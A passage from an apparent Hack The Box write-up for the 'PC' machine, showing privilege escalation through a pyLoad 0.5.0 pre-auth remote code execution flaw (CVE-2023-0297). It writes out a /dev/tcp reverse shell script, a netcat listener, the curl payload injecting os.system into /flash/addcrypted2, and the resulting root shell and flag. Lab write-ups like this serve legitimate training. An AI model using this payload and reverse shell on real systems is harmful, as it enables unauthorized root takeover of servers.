+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.77 seconds
+</span></span></code></pre></div><p>I open <code>firefox</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ firefox 127.0.0.1:1234
+</span></span></code></pre></div><p>I discover the <code>version</code> of pyload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sau@pc:/dev/shm$ pyload --version
+</span></span><span style="display:flex;"><span>pyLoad 0.5.0
+</span></span><span style="display:flex;"><span>sau@pc:/dev/shm$ 
+</span></span></code></pre></div><p>This version it has a vulnerability, I see the PoC <code>https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad/blob/main/README.md</code></p>
+<p>I make a <code>reverse shell</code> on Target Machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sau@pc:/dev/shm$ nano rev.sh
+</span></span><span style="display:flex;"><span>sau@pc:/dev/shm$ cat rev.sh
+</span></span><span style="display:flex;"><span>sh -i &gt;&amp; /dev/tcp/10.10.14.148/4444 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>sau@pc:/dev/shm$ chmod a<span style="color:#f92672">=</span>+w+r+x rev.sh
+</span></span></code></pre></div><p>I open a listening port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span></code></pre></div><p>I exploit the <code>Remote Code Execution</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> --data-binary <span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/dev/shm/rev.sh\&#34;);f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> <span style="color:#e6db74">$&#39;http://127.0.0.1:1234/flash/addcrypted2&#39;</span>
+</span></span></code></pre></div><p>I get the <code>root flag</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.148] from (UNKNOWN) [10.10.11.214] 35026
+sh: 0: can&#39;t access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt
+ff3be728b13b976379bd857f720be234
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/pilgrimage/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB Writeup - Pilgrimage (Easy)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/keeper/">
+                <span class="button__text">HTB Writeup - Keeper (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
